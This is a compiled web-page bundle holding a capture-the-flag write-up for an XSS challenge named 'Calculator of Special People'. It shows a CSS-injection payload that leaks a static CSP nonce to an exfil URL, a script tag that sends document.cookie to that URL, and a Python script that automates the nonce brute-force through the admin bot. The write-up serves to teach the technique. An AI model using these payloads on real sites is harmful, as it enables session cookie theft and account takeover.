"use strict";(self.webpackChunkmy_writeups=self.webpackChunkmy_writeups||[]).push([[814],{1763:(e,t,n)=>{n.d(t,{A:()=>r});const r=n.p+"assets/images/nonce-leak-e559c1e26dd3f3f838f1234590fa3673.png"},1894:(e,t,n)=>{n.d(t,{A:()=>r});const r=n.p+"assets/images/report-d04c1d5a206e567ac9452980265a3a42.png"},3479:(e,t,n)=>{n.d(t,{A:()=>m});n(6540);const r="container___Cc",i="title_tpbO",s="metadataGrid_ZRbO",a="metadataItem_lx5l",l="metadataLabel_jRgE",o="metadataValue_W2fg",c="metadataDescription_M71I",d="downloadContainer_IhTj",h="downloadButton_Hmhz",p="easy_ROA0",x="medium_DRCv",u="hard_M2R7",f="insane_pron";var j=n(4848);const m=e=>{let{title:t,author:n,points:m,difficulty:g,solves:b,description:_,chall:y}=e;return(0,j.jsxs)("div",{className:r,children:[t&&(0,j.jsx)("h1",{className:i,children:t}),(0,j.jsxs)("div",{className:s,children:[n&&(0,j.jsxs)("div",{className:a,children:[(0,j.jsx)("span",{className:l,children:"Author"}),(0,j.jsx)("span",{className:o,children:n})]}),m&&(0,j.jsxs)("div",{className:a,children:[(0,j.jsx)("span",{className:l,children:"Points"}),(0,j.jsx)("span",{className:o,children:m})]}),void 0!==b&&(0,j.jsxs)("div",{className:a,children:[(0,j.jsx)("span",{className:l,children:"Solves"}),(0,j.jsx)("span",{className:o,children:b})]}),g&&(0,j.jsxs)("div",{className:a,children:[(0,j.jsx)("span",{className:l,children:"Difficulty"}),(0,j.jsx)("span",{className:`${o} ${(e=>{switch(e){case"Easy":return p;case"Medium":return x;case"Hard":return u;case"Insane":return f;default:return""}})(g)}`,children:g})]}),_&&(0,j.jsxs)("div",{className:c,children:[(0,j.jsx)("span",{className:l,children:"Description"}),(0,j.jsx)("span",{className:o,children:_})]}),y&&(0,j.jsx)("div",{className:d,children:(0,j.jsx)("a",{href:y,download:!0,className:h,children:"\ud83d\udce6 Download Chall"})})]})]})}},6317:(e,t,n)=>{n.d(t,{A:()=>c});n(6540);const r="flagContainer_gBo2",i="flagHeader_Z7yy",s="flagIcon_bQJY",a="flagTitle_XgHe",l="flagContent__HI0";var o=n(4848);const c=e=>{let{children:t}=e;return(0,o.jsxs)("div",{className:r,children:[(0,o.jsxs)("div",{className:i,children:[(0,o.jsx)("span",{className:s,children:"\ud83d\udea9"}),(0,o.jsx)("span",{className:a,children:"FLAG"})]}),(0,o.jsx)("div",{className:l,children:(0,o.jsx)("pre",{children:t})})]})}},7928:(e,t,n)=>{n.d(t,{A:()=>r});const r=n.p+"assets/images/root-4987b7b807708cc9b0e165e704170458.png"},8453:(e,t,n)=>{n.d(t,{R:()=>a,x:()=>l});var r=n(6540);const i={},s=r.createContext(i);function a(e){const t=r.useContext(s);return r.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function l(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:a(e.components),r.createElement(s.Provider,{value:t},e.children)}},9352:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>d,contentTitle:()=>c,default:()=>x,frontMatter:()=>o,metadata:()=>r,toc:()=>h});const r=JSON.parse('{"id":"arkavidia-2025/web-exploitation/calculator-of-special-people","title":"Calculator of Special People","description":"Steal the cookie, like how Minji steals hearts.","source":"@site/docs/arkavidia-2025/web-exploitation/calculator-of-special-people.mdx","sourceDirName":"arkavidia-2025/web-exploitation","slug":"/arkavidia-2025/web-exploitation/calculator-of-special-people","permalink":"/CTF-writeups/docs/arkavidia-2025/web-exploitation/calculator-of-special-people","draft":false,"unlisted":false,"tags":[{"inline":true,"label":"XSS","permalink":"/CTF-writeups/docs/tags/xss"},{"inline":true,"label":"CSP","permalink":"/CTF-writeups/docs/tags/csp"},{"inline":true,"label":"CSS Injection","permalink":"/CTF-writeups/docs/tags/css-injection"}],"version":"current","sidebarPosition":1,"frontMatter":{"title":"Calculator of Special People","sidebar_position":1,"description":"Steal the cookie, like how Minji steals hearts.","tags":["XSS","CSP","CSS Injection"]},"sidebar":"writeupsSidebar","previous":{"title":"\ud83c\udf10 Web Exploitation","permalink":"/CTF-writeups/docs/category/-web-exploitation"},"next":{"title":"\ud83d\udd0d Forensics","permalink":"/CTF-writeups/docs/category/-forensics"}}');var i=n(4848),s=n(8453),a=n(6317),l=n(3479);const o={title:"Calculator of Special People",sidebar_position:1,description:"Steal the cookie, like how Minji steals hearts.",tags:["XSS","CSP","CSS Injection"]},c="Calculator of Special People",d={},h=[{value:"Chall Details \ud83d\udcdd",id:"chall-details-",level:2},{value:"Goal \ud83c\udfc1",id:"goal-",level:2},{value:"Endpoints \ud83d\udd78\ufe0f",id:"endpoints-\ufe0f",level:2},{value:"Solution \ud83d\udca1",id:"solution-",level:2},{value:"Script \ud83d\udcbb",id:"script-",level:2}];function p(e){const t={admonition:"admonition",br:"br",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",li:"li",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,s.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(t.header,{children:(0,i.jsx)(t.h1,{id:"calculator-of-special-people",children:"Calculator of Special People"})}),"\n",(0,i.jsx)(l.A,{author:"dovodedomo",points:919,difficulty:"Easy",solves:10,description:"Steal the cookie, like how Minji steals hearts.",chall:"/files/arkavidia-2025/calculator-of-special-people/dist.zip"}),"\n",(0,i.jsx)(a.A,{children:"ARKAV{NONcE_0F_US_IS_AS_SMART_AS_ALL_OF_US}"}),"\n",(0,i.jsx)(t.h2,{id:"chall-details-",children:"Chall Details \ud83d\udcdd"}),"\n",(0,i.jsxs)(t.table,{children:[(0,i.jsx)(t.thead,{children:(0,i.jsxs)(t.tr,{children:[(0,i.jsx)(t.th,{style:{textAlign:"left"},children:"Aspects"}),(0,i.jsx)(t.th,{style:{textAlign:"left"},children:"App"}),(0,i.jsx)(t.th,{style:{textAlign:"left"},children:"Bot"})]})}),(0,i.jsxs)(t.tbody,{children:[(0,i.jsxs)(t.tr,{children:[(0,i.jsx)(t.td,{style:{textAlign:"left"},children:"Language"}),(0,i.jsx)(t.td,{style:{textAlign:"left"},children:"Node.js"}),(0,i.jsx)(t.td,{style:{textAlign:"left"},children:"Node.js"})]}),(0,i.jsxs)(t.tr,{children:[(0,i.jsx)(t.td,{style:{textAlign:"left"},children:"Port"}),(0,i.jsx)(t.td,{style:{textAlign:"left"},children:"8020"}),(0,i.jsx)(t.td,{style:{textAlign:"left"},children:"8021:80"})]})]})]}),"\n",(0,i.jsx)(t.h2,{id:"goal-",children:"Goal \ud83c\udfc1"}),"\n",(0,i.jsx)(t.p,{children:"Steal the flag, which is placed as the admin bot's cookie."}),"\n",(0,i.jsx)(t.h2,{id:"endpoints-\ufe0f",children:"Endpoints \ud83d\udd78\ufe0f"}),"\n",(0,i.jsxs)(t.ul,{children:["\n",(0,i.jsxs)(t.li,{children:["\n",(0,i.jsxs)(t.p,{children:[(0,i.jsx)(t.code,{children:"/report"})," : The admin bot's page.",(0,i.jsx)(t.br,{}),"\n","The ",(0,i.jsx)(t.code,{children:"/report"})," page is accessible from the outside network, and it contains the flag in the form of a cookie.",(0,i.jsx)(t.br,{}),"\n","An input text field is provided to report a url. The bot will then access the url and report back the response.",(0,i.jsx)(t.br,{}),"\n",(0,i.jsx)("u",{children:"The flag could be stolen through XSS (Cross-site scripting)."}),"\r\n",(0,i.jsx)(t.img,{alt:"report endpoint",src:n(1894).A+"",width:"1919",height:"1030"})]}),"\n",(0,i.jsx)(t.admonition,{type:"tip",children:(0,i.jsxs)(t.p,{children:["A challenge with a flag in the form of a cookie of an admin bot is usually an ",(0,i.jsx)(t.strong,{children:"XSS challenge"}),"."]})}),"\n"]}),"\n",(0,i.jsxs)(t.li,{children:["\n",(0,i.jsxs)(t.p,{children:[(0,i.jsx)(t.code,{children:"/"})," : The main page of the calculator.",(0,i.jsx)(t.br,{}),"\n","This page is only accessible from the local network, so you need to access it through the bot."]}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-nginx",metastring:'title="proxy.conf"',children:"server {\r\n  listen 80;\r\n  absolute_redirect off;\r\n\r\n  location /report/ {\r\n      proxy_pass http://bot/;\r\n      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\r\n  }\r\n\r\n  location / {\r\n      deny all; # prevent access from outside network\r\n      proxy_pass http://app:8020/;\r\n      proxy_buffering off;\r\n      proxy_set_header X-Real-IP $remote_addr;\r\n      proxy_set_header X-Forwarded-Host $host;\r\n      proxy_set_header X-Forwarded-Port $server_port;\r\n  }\r\n}\n"})}),"\n",(0,i.jsx)(t.p,{children:"If we analyze it locally using the provided source code, we can see that the page is protected by a CSP (Content Security Policy)."}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-html",metastring:'title="/app/html/index.html"',children:"... snip ...\r\n<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'nonce-{{nonce}}'; style-src 'self' 'unsafe-inline'; frame-src 'none'; object-src 'none'; base-uri 'self'; media-src 'self'; font-src 'self';\">\r\n... snip ...\n"})}),"\n",(0,i.jsxs)(t.p,{children:["From the snippet above, we can conclude that the app is ",(0,i.jsx)("u",{children:"vulnerable to CSS Injection"}),", since style-src is set to ",(0,i.jsx)(t.code,{children:"unsafe-inline"}),"."]}),"\n",(0,i.jsxs)(t.p,{children:["Every partnerName input is reflected to the DOM. If we could bypass the CSP, we could inject a script to steal the cookie.\r\n",(0,i.jsx)(t.img,{alt:"calculator-of-special-people",src:n(7928).A+"",width:"1919",height:"1030"})]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(t.h2,{id:"solution-",children:"Solution \ud83d\udca1"}),"\n",(0,i.jsxs)(t.p,{children:["Notice how there's a ",(0,i.jsx)(t.code,{children:"nonce"})," in the CSP header. Typically, ",(0,i.jsx)(t.code,{children:"nonce"})," is randomized for every request.\r\nHowever, in this case, the ",(0,i.jsx)(t.code,{children:"nonce"})," is static. This means that we can inject a script with the ",(0,i.jsx)(t.code,{children:"nonce"})," value as the ",(0,i.jsx)(t.code,{children:"nonce"})," attribute."]}),"\n",(0,i.jsxs)(t.p,{children:["But, how do we get the ",(0,i.jsx)(t.code,{children:"nonce"})," value?\r\nWe can get the ",(0,i.jsx)(t.code,{children:"nonce"})," value by utilizing CSS Injection.",(0,i.jsx)(t.br,{}),"\n","The ",(0,i.jsx)(t.code,{children:"nonce"})," is not just located in the ",(0,i.jsx)(t.code,{children:"meta"})," tag, but also hidden in the ",(0,i.jsx)(t.code,{children:"input"})," field."]}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-html",children:'<style>\r\n  input[name="nonce"]{display:block!important;}\r\n  input[name="nonce"][value^="{test_prefix}"]{background:url({exfil_url}?q={test_prefix});}\r\n</style>\'\n'})}),"\n",(0,i.jsxs)(t.p,{children:["Using this approach, if exists a ",(0,i.jsx)(t.code,{children:"nonce"})," value that starts with ",(0,i.jsx)(t.code,{children:"{test_prefix}"}),", the background image will be loaded from ",(0,i.jsx)(t.code,{children:"{exfil_url}?q={test_prefix}"}),".\r\nWe can check from our server (either webhook.site or ",(0,i.jsx)(t.code,{children:"python -m http.server 8000"})," + ngrok) if the request is made. If the request is made, we can extract the ",(0,i.jsx)(t.code,{children:"nonce"})," value from the ",(0,i.jsx)(t.code,{children:"q"})," parameter."]}),"\n",(0,i.jsxs)(t.p,{children:["Do this for enough time, and the ",(0,i.jsx)(t.code,{children:"nonce"})," value will be revealed.",(0,i.jsx)(t.br,{}),"\n",(0,i.jsx)(t.img,{alt:"nonce leak",src:n(1763).A+"",width:"855",height:"418"})]}),"\n",(0,i.jsxs)(t.p,{children:["After we get the ",(0,i.jsx)(t.code,{children:"nonce"})," value, we can inject a script to steal the cookie."]}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-html",children:"<script nonce=\"arvAK9\">\r\n  fetch('{exfil_url}?c='+document.cookie);\r\n<\/script>\n"})}),"\n",(0,i.jsx)(t.admonition,{type:"note",children:(0,i.jsxs)(t.p,{children:[(0,i.jsx)(t.code,{children:"exfil_url"})," is the URL where the ",(0,i.jsx)(t.code,{children:"nonce"})," value is exfiltrated."]})}),"\n",(0,i.jsx)(t.p,{children:"After the script is injected, the cookie will be sent to the webhook/http server."}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{alt:"flag exfiltration",src:n(9409).A+"",width:"576",height:"340"})}),"\n",(0,i.jsx)(t.h2,{id:"script-",children:"Script \ud83d\udcbb"}),"\n",(0,i.jsxs)(t.p,{children:["The following script loops through all printable ASCII characters to exfiltrate the ",(0,i.jsx)(t.code,{children:"nonce"})," value.\r\nHowever, the script is interactive, so you need to input whether the character is correct or not.",(0,i.jsx)(t.br,{}),"\n","You may call it semi-bruteforce, i guess?"]}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-python",children:'import time\r\nimport requests\r\nimport urllib.parse\r\nimport string\r\n\r\n# ----- Injector Setup -----\r\nbase_url = ""  # Base URL of the target application\r\ntarget_url = f"{base_url}/report/"\r\nbase_injection_url = "http://app:8020/"\r\nheaders = {}\r\n\r\ncharset = string.printable.strip()  # All printable ASCII characters\r\nexfil_url = "" # URL to exfiltrate the nonce value\r\n\r\ndef send_payload(prefix, candidate):\r\n    """Send a payload for a given character at the next position."""\r\n    test_prefix = prefix + candidate\r\n    css_payload = (\r\n        f\'<style>\'\r\n        f\'input[name="nonce"]{{display:block!important;}}\'\r\n        f\'input[name="nonce"][value^="{test_prefix}"]{{background:url({exfil_url}?q={test_prefix});}}\'\r\n        f\'</style>\'\r\n    )\r\n    injection = base_injection_url + "?partnerName=" + urllib.parse.quote(css_payload)\r\n    data = {"url": injection}\r\n\r\n    print(f"[*] Trying candidate \'{candidate}\' (prefix: {test_prefix})")\r\n    try:\r\n        resp = requests.post(target_url, headers=headers, data=data, timeout=5)\r\n        print(f"    Sent payload; status: {resp.status_code}")\r\n    except Exception as e:\r\n        print(f"    Error sending payload for \'{candidate}\': {e}")\r\n\r\n    time.sleep(1)  # 1-second delay to prevent rate limiting\r\n\r\n# Loop to keep testing different prefixes\r\nwhile True:\r\n    prefix = input("\\n[?] Enter known prefix (or leave empty to exit): ").strip()\r\n    if not prefix:\r\n        print("[-] Exiting.")\r\n        break\r\n\r\n    for candidate in charset:\r\n        send_payload(prefix, candidate)\r\n\r\n        # Ask for user input before proceeding\r\n        user_input = input(f"[?] Was \'{candidate}\' correct? (y/n): ").strip().lower()\r\n        if user_input == \'y\':\r\n            prefix += candidate  # Append the correct character\r\n            print(f"[+] Updated prefix: {prefix}")\r\n            break  # Move to the next position\r\n        elif user_input == \'n\':\r\n            continue  # Try the next candidate\r\n\r\n    print(f"[*] Current prefix: {prefix} - Proceeding to next character.")\n'})})]})}function x(e={}){const{wrapper:t}={...(0,s.R)(),...e.components};return t?(0,i.jsx)(t,{...e,children:(0,i.jsx)(p,{...e})}):p(e)}},9409:(e,t,n)=>{n.d(t,{A:()=>r});const r=n.p+"assets/images/flag-exfil-757b0d205c5b1a68466de4b6e17d0aa8.png"}}]);